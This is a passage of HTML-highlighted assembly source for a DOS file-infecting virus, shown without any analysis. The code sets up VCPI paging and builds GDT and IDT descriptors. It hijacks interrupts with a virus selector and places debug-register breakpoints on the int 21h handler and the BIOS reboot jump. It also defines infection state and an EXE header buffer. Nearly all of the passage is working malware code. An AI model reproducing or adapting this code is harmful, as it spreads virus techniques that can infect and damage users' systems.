        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0DE06h</span><span class="sc0">    </span><span class="sc1">; VCPI - Get dir page phys addr in 1st MB</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VCPI</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">_CR3</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; EDX = physical address of dir page</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0DE06h</span><span class="sc0">    </span><span class="sc1">; VCPI - Get phys addr of page in 1st MB</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; Addr of page table</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VCPI</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">            </span><span class="sc1">; User level, read-write, present</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">      </span><span class="sc1">; Store page table in page directory</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     

</span><span class="sc5">VCPI</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">67h</span><span class="sc0">             </span><span class="sc1">;  - LIM EMS </span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">           </span><span class="sc1">; Error or VCPI not present ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_ems_error</span><span class="sc0">    </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exec_host</span><span class="sc0">
</span><span class="sc5">no_ems_error</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   DATA SEGMENT DESCRIPTOR</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    31                23                15                7               0</span><span class="sc0">
</span><span class="sc1">;   ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÑÍÑÍÑÍÑÍÍÍÍÍÍÍÍÍØÍÑÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»</span><span class="sc0">
</span><span class="sc1">;   º                 ³ ³ ³ ³A³ LIMIT   ³ ³     ³  TYPE   ³                 º</span><span class="sc0">
</span><span class="sc1">;   º   BASE 31..24   ³G³B³0³V³ 19..16  ³P³ DPL ³         ³   BASE 23..16   º 4</span><span class="sc0">
</span><span class="sc1">;   º                 ³ ³   ³L³         ³ ³     ³1³0³E³W³A³                 º</span><span class="sc0">
</span><span class="sc1">;   ÇÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÁÄÁÄÁÄÁÄÄÄÄÄÄÄÄÄÅÄÁÄÄÄÄÄÁÄÁÄÁÄÁÄÁÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶</span><span class="sc0">
</span><span class="sc1">;   º                                   ³                                   º</span><span class="sc0">
</span><span class="sc1">;   º        SEGMENT BASE 15..0         ³        SEGMENT LIMIT 15..0        º 0</span><span class="sc0">
</span><span class="sc1">;   º                                   ³                                   º</span><span class="sc0">
</span><span class="sc1">;   ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   EXECUTABLE SEGMENT DESCRIPTOR</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    31                23                15                7               0</span><span class="sc0">
</span><span class="sc1">;   ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÑÍÑÍÑÍÑÍÍÍÍÍÍÍÍÍØÍÑÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»</span><span class="sc0">
</span><span class="sc1">;   º                 ³ ³ ³ ³A³ LIMIT   ³ ³     ³  TYPE   ³                 º</span><span class="sc0">
</span><span class="sc1">;   º   BASE 31..24   ³G³D³0³V³ 19..16  ³P³ DPL ³         ³   BASE 23..16   º 4</span><span class="sc0">
</span><span class="sc1">;   º                 ³ ³ ³ ³L³         ³ ³     ³1³0³C³R³A³                 º</span><span class="sc0">
</span><span class="sc1">;   ÇÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÁÄÁÄÁÄÁÄÄÄÄÄÄÄÄÄÅÄÁÄÄÄÄÄÁÄÁÄÁÄÁÄÁÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶</span><span class="sc0">
</span><span class="sc1">;   º                                   ³                                   º</span><span class="sc0">
</span><span class="sc1">;   º        SEGMENT BASE 15..0         ³        SEGMENT LIMIT 15..0        º 0</span><span class="sc0">
</span><span class="sc1">;   º                                   ³                                   º</span><span class="sc0">
</span><span class="sc1">;   ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   DESCRIPTORS USED FOR SPECIAL SYSTEM SEGMENTS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    31                23                15                7               0</span><span class="sc0">
</span><span class="sc1">;   ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÑÍÑÍÑÍÑÍÍÍÍÍÍÍÍÍØÍÑÍÍÍÍÍÑÍÑÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»</span><span class="sc0">
</span><span class="sc1">;   º                 ³ ³ ³ ³A³         ³ ³     ³ ³       ³                 º</span><span class="sc0">
</span><span class="sc1">;   º   BASE 31..24   ³G³X³O³V³ LIMIT   ³P³ DPL ³0³  TYPE ³  BASE 23..16    º 4</span><span class="sc0">
</span><span class="sc1">;   º                 ³ ³ ³ ³L³ 19..16  ³ ³     ³ ³       ³                 º</span><span class="sc0">
</span><span class="sc1">;   ÇÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÁÄÁÄÁÄÁÄÄÄÄÄÄÄÄÄÅÄÁÄÄÄÄÄÁÄÁÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶</span><span class="sc0">
</span><span class="sc1">;   º                                   ³                                   º</span><span class="sc0">
</span><span class="sc1">;   º        SEGMENT BASE 15..0         ³       SEGMENT LIMIT 15..0         º 0</span><span class="sc0">
</span><span class="sc1">;   º                                   ³                                   º</span><span class="sc0">
</span><span class="sc1">;   ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        A   - ACCESSED                              E   - EXPAND-DOWN</span><span class="sc0">
</span><span class="sc1">;        AVL - AVAILABLE FOR PROGRAMMERS USE         G   - GRANULARITY</span><span class="sc0">
</span><span class="sc1">;        B   - BIG                                   P   - SEGMENT PRESENT</span><span class="sc0">
</span><span class="sc1">;        C   - CONFORMING                            R   - READABLE</span><span class="sc0">
</span><span class="sc1">;        D   - DEFAULT                               W   - WRITABLE</span><span class="sc0">
</span><span class="sc1">;        DPL - DESCRIPTOR PRIVILEGE LEVEL</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; System and Gate descriptor types :</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Code     Type of Segment or Gate</span><span class="sc0">
</span><span class="sc1">;  0       -reserved</span><span class="sc0">
</span><span class="sc1">;  1       Available 286 TSS</span><span class="sc0">
</span><span class="sc1">;  2       LDT</span><span class="sc0">
</span><span class="sc1">;  3       Busy 286 TSS</span><span class="sc0">
</span><span class="sc1">;  4       Call Gate</span><span class="sc0">
</span><span class="sc1">;  5       Task Gate</span><span class="sc0">
</span><span class="sc1">;  6       286 Interrupt Gate</span><span class="sc0">
</span><span class="sc1">;  7       286 Trap Gate</span><span class="sc0">
</span><span class="sc1">;  8       -reserved</span><span class="sc0">
</span><span class="sc1">;  9       Available 386 TSS</span><span class="sc0">
</span><span class="sc1">;  A       -reserved</span><span class="sc0">
</span><span class="sc1">;  B       Busy 386 TSS</span><span class="sc0">
</span><span class="sc1">;  C       386 Call Gate</span><span class="sc0">
</span><span class="sc1">;  D       -reserved</span><span class="sc0">
</span><span class="sc1">;  E       386 Interrupt Gate</span><span class="sc0">
</span><span class="sc1">;  F       386 Trap Gate</span><span class="sc0">


</span><span class="sc5">build_descriptor</span><span class="sc4">:</span><span class="sc0">
                                        </span><span class="sc1">; AX = descriptor</span><span class="sc0">
                                        </span><span class="sc1">; CX = base address</span><span class="sc0">
                                        </span><span class="sc1">; BX = limit</span><span class="sc0">
                                        </span><span class="sc1">; DX = rights</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">   </span><span class="sc1">; Limit 15..0</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">][</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">; Base 15..0</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">][</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0"> </span><span class="sc1">; Base 23..16</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">][</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0"> </span><span class="sc1">; Type, DPL, P,...</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">][</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0"> </span><span class="sc1">; Limit 19..16, AVL, G,...</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">][</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0"> </span><span class="sc1">; Base 31..24</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     

</span><span class="sc5">set_breakpoints</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">i21h_ep</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dr0</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Address for breakpoint 0 (int 21h)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FE05Bh</span><span class="sc0">     </span><span class="sc1">; BIOS address: near jump to reboot</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dr1</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Address for breakpoint 1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dr6</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Clear dr6 (the processor never clears it)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000000000000000000001000001010b</span><span class="sc0">
</span><span class="sc1">;                                                       ^ ^</span><span class="sc0">
</span><span class="sc1">;                                                       2 breakpoints (globals)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dr7</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     

</span><span class="sc5">set_ds</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     


</span><span class="sc1">;  80386 INTERRUPT GATE</span><span class="sc0">
</span><span class="sc1">;  31                23                15                7                0</span><span class="sc0">
</span><span class="sc1">;  ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÑÍÍÍÑÍÍÍÍÍÍÍÍÍØÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍ»</span><span class="sc0">
</span><span class="sc1">;  º           OFFSET 31..16           ³ P ³DPL³0 1 1 1 0³0 0 0³(NOT USED) º4</span><span class="sc0">
</span><span class="sc1">;  ÇÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÁÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄ¶</span><span class="sc0">
</span><span class="sc1">;  º             SELECTOR              ³           OFFSET 15..0            º0</span><span class="sc0">
</span><span class="sc1">;  ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  80386 TRAP GATE</span><span class="sc0">
</span><span class="sc1">;  31                23                15                7                0</span><span class="sc0">
</span><span class="sc1">;  ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÑÍÍÍÑÍÍÍÍÍÍÍÍÍØÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍ»</span><span class="sc0">
</span><span class="sc1">;  º          OFFSET 31..16            ³ P ³DPL³0 1 1 1 1³0 0 0³(NOT USED) º4</span><span class="sc0">
</span><span class="sc1">;  ÇÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÁÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄ¶</span><span class="sc0">
</span><span class="sc1">;  º             SELECTOR              ³           OFFSET 15..0            º0</span><span class="sc0">
</span><span class="sc1">;  ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼</span><span class="sc0">

</span><span class="sc5">build_idt_descriptor</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">; On entry:</span><span class="sc0">
                                </span><span class="sc1">;       ECX = interrupt number</span><span class="sc0">
                                </span><span class="sc1">;       AX  = address of service routine</span><span class="sc0">
                                </span><span class="sc1">;       DI  = address to store orig int &amp; sel</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">IDT_base</span><span class="sc0">         </span><span class="sc1">; Access to IDT</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">][</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Offset 31..16</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Offset 15..0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; Save original int</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">][</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get selector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">            </span><span class="sc1">; Save original selector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">virus_selector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">][</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Set new selector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; Set new interrupt (15..0)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">][</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;           (31..16)</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     

</span><span class="sc5">system_registers</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_CR3</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">addr_GDTR</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">addr_IDTR</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LDTR</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TR</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">TSS_SEL</span><span class="sc0">                 </span><span class="sc1">; TSS selector</span><span class="sc0">
</span><span class="sc5">pm_EIP</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">pm_entry_point</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; Protected mode EIP</span><span class="sc0">
</span><span class="sc5">pm_CS</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">CODE_SEL</span><span class="sc0">                </span><span class="sc1">; Protected mode CS selector</span><span class="sc0">

</span><span class="sc5">GDTR</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">limit_gdt</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">47h</span><span class="sc0">
</span><span class="sc5">base_gdt</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">IDTR</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">limit_idt</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0FFFFh</span><span class="sc0">
</span><span class="sc5">base_idt</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">host_type</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">codesegment</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pm_ep</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">VCPICS_SEL</span><span class="sc0">

</span><span class="sc5">virus_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">size_mcb</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">orig_i1</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sel_i1</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">orig_i9</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sel_i9</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">i21h_ep</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">virus_cs</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">virus_selector</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">pages_4K</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">page_1</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">page_2</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">page_3</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">page_4</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">old_pages</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">old_page2</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">old_page3</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">addr_dir_page</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">infecting</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pagetable</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">GDT</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">GDT_limit</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GDT_base</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">IDT</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">IDT_limit</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IDT_base</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
</span><span class="sc5">BUFFER_SIZE</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">1000h</span><span class="sc0">
</span><span class="sc5">_stack</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">buffer1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">BUFFER_SIZE</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">buffer2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">header</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">signature</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">image_size</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pages</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">relo_items</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">header_size</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mim_mem</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
